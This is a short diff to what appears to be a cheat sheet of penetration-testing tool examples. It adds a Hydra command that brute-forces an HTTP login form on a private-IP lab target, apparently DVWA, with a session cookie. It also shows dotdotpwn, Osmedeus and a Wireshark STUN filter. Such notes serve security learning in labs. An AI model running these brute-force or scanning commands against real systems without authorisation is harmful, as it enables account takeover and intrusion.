@@ -30,4 +30,7 @@ example: dotdotpwn -m http-url -u 'https://0a0900d1039ef266805b6ca5006500cc.web-
 11-Osmedeus
 example: osmedeus scan -t sample.com -f extensive
 
+12-Hydra
+example: hydra -l admin -P passes.txt 'http-get-form://192.168.1.10/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=u609j7ku7kakjh53bomt711p22; security=low:F=Username and/or password incorrect.' -V
+
 wireshark> stun && !(ip.src == local-ip) && stun.type == 0x0101 
